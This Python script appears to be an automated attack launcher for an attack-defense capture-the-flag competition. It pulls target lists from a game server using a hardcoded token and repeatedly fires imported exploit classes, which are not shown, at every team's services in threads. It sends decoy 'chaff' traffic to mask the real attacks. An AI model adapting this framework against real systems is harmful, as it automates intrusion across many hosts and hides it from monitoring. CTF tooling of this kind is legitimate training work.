#!/usr/bin/env python3

from Base_Exploit import Exploit
from Exploit_1 import Exploit1
from Exploit_2 import Exploit2
import random
import threading
import time
from swpag_client import Team # pip install swpag_client

debug = True
debug_chaff = False
round_time_in_seconds = 10
chaff_to_real_ratio = 3
flag_server_ip = '127.0.0.1'
#flag_server_ip = '10.4.85.9'
flag_port = 31337
args_dict = {}

#exploit list in format (ExploitClass, exploit_port, exploit_name)
exploit_list = []

def submit_flag(name, flag):
    print("{}Received Flag: {}".format(name, flag))
    submit_flag = Exploit(flag_server_ip, flag_port, "Flag Submission Client", debug, debug_chaff)
    submit_flag.connect_to_server()
    submit_flag.send_and_close(flag, submit_flag.sock)

def launch_exploit(Exploit, ip, port, name, debug, debug_chaff):
    new_exploit = Exploit(ip, port, name, debug, debug_chaff)
    chaff_array = [False]*chaff_to_real_ratio
    chaff_array.append(True)
    random.shuffle(chaff_array)  
    for value in chaff_array:
        if value:
            target, flag = new_exploit.get_flag()
            # submit_flag(target, flag)
        else:
            new_exploit.send_chaff()

def team_ip(team_host):
    team_number = int(team_host[4:])
    major = round((team_number % 20))
    if team_number <=20:
        minor = 3
    else:
        minor = 4    
    if major==0:
        major = 20
    return '10.9.{major}.{minor}'.format(major=major, minor=minor)

if __name__ == "__main__":
    print("[*] Starting Launcher")
    ips=[]
    ports=[]
    exploit_ports=[]
    team = Team('http://52.52.83.248', "wYZhMmKntJD5yyegAzVl")
    services = team.get_service_list()
    for service in services:
        targets = team.get_targets(service['service_id'])
    for target in targets:
        ips.append(team_ip(target['hostname']))
        print(target['hostname']+" : "+team_ip(target['hostname']))   
        ports.append(target['port'])
    unique_ports = set(ports)
    for prt in unique_ports:
        print(prt)
        exploit_ports.append(prt)
    for port in exploit_ports:
        exploit_list.append((Exploit1,port,"Exploit1"))
        exploit_list.append((Exploit2,port,"Exploit2"))
    
    #launch the exploits
    while True:
        i=0
        for ip in ips:
            if i != 2:
                for Exploit, port, name in exploit_list:
                    t = threading.Thread(
                        name=name+ " against " + ip,
                        target=launch_exploit,
                        args=(Exploit, ip, port, name, debug, debug_chaff))
                    t.start()
                    print("Lauch exploit started:"+name+ " against " + str(ip) + " port "+ str(port))
                    print("Sleeping..... for "+str(round_time_in_seconds)+ " seconds ")        
                    time.sleep(round_time_in_seconds)
                    print("Starting back..... after 10 seconds")    
            i=i+1        
